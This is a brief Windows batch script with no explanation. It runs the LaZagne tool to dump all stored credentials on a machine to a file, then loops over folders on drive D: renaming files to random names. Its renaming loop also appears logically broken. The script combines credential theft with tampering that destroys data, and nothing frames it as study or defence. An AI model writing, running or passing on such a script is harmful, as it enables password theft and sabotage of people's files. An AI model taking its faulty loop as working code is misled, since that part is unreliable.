@echo off
setlocal enabledelayedexpansion
cd C:\temp
lazagne.exe all -oN
cd /d D:\
for  /f "delims=" %%a in ('dir /ad /b') do (
for /f "delims=" %%b in ('dir /a-d /on /b') do (
ren "%%a\%%b" "%random%"
)
)
